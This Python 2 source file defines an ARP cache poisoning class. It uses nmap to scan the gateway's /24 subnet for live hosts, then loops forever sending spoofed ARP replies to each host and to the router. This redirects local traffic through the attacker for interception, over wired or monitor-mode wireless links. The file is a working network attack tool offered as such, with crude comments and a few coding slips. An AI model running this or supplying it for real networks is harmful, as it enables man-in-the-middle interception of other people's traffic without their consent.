from multiprocessing import Process
import os
import sys
from scapy.all import sendp,Ether,ARP,get_if_hwaddr,getmacbyip,RadioTap,conf
import time
from random import randint
from datetime import datetime
import nmap
import gen_utils as gu
conf.verb = 0 #shut the fuck up scapy


class Arp_poison:
    def __init__(self, pub_ip, gateway, iface = "eth0", wireless = False, DEBUG = False, log = False):
        self.iface = iface  # in case of wireless, it has to be one in monitor mode
        self.mac = get_if_hwaddr(self.iface)
        self.pub_ip = pub_ip
        self.gateway = gateway
        self.poison_pid = 0
        self.router_mac = getmacbyip(self.gateway)
        self.wireless = wireless  # currently this flag needs to be set manually
        self.debug = DEBUG
        self.log = log
        if self.wireless == True and os.system("iwconfig " + iface + "| grep Monitor >/dev/null 2>&1") != 0:
            raise Exception("invalidIface")
        if self.DEBUG:
            print self.iface
            print self.mac
            print self.gateway
            print self.router_mac
            conf.verb = 3
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")


    def __del__(self):
        if self.poison_pid !=0:
            os.kill(self.poison_pid, 9)
            self.restore_arp_table()
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Destroying the Arp_poison object at pub ip: " + self.pub_ip + str(datetime.now()) + "\n")


    def __get_targets(self, subnet):
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Started scanning " + str(datetime.now()) + "\n")
        finlst = []
        raw = nmap.PortScanner().scan(hosts=subnet, arguments='-sn')
        for a, b in raw['scan'].items():
            if str(b['status']['state']) == 'up':
                try:
                    finlst.append([str(b['addresses']['ipv4']), str(b['addresses']['mac'])])
                except:
                    pass
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Finished scanning " + str(datetime.now()) + "\n")
        return finlst


    def __send_poison(self):
        print "Scanning for alive hosts.."
        target = self.__get_targets(str(self.gateway+"/24"))
        print "Done!"
        if self.log:
            with open("/var/log/fun&games.log", "a") as f:
                f.write("Poisoning the ARP cache " + str(datetime.now()) + "\n")
        while True:
            try:
                for i in range(len(target)):
                    if self.wireless == False:
                        poison_target = Ether()/ARP(op=2, psrc=self.gateway, pdst=target[i][0], hwdst=target[i][1])
                        poison_router = Ether()/ARP(op=2, psrc=target[i][0], pdst=self.gateway, hwdst=self.router_mac)
                        sendp(poison_target)
                        sendp(poison_router)
                    else:
                        poison_target = RadioTap()/ARP(op=2, psrc=self.gateway, pdst=target[i][0], hwdst=target[i][1])
                        poison_router = RadioTap()/ARP(op=2, psrc=target[i][0], pdst=self.gateway, hwdst=self.router_mac)
                        sendp(poison_target, iface=self.iface)
                        sendp(poison_router, iface=self.iface)
                time.sleep(1)
            except:
                if self.log:
                    with open("/var/log/fun&games.log", "a") as f:
                        f.write("ARP poisoning failed " + str(datetime.now()) + "\n")
                sys.exit("A major fuckup, can't spam my favorite ARP requests..")


    def poison_arp_table(self):
        if self.wireless == True and os.system("iwconfig " + iface + "| grep Monitor >/dev/null 2>&1") != 0:
            raise Exception("invalidIface")
        proc = Process(target = self.__send_poison)
        proc.start()
        self.poison_pid = proc.pid
        if self.debug:
            print "__send_poison PID: " + self.poison_pid


    def restore_arp_table(self):
        if self.poison_pid != 0:
            if self.log:
                with open("/var/log/fun&games.log", "a") as f:
                    f.write("Restoring ARP cache " + str(datetime.now()) + "\n")
            os.kill(self.poison_pid, 9)
            if self.wireless == False:
                pkt = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
            else:
                pkt = RadioTap()/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
            sendp(pkt, iface= self.iface, inter=0.2, count=40)
            self.poison_pid = 0
        else:
            print "Not running :/ ..."
        return 0
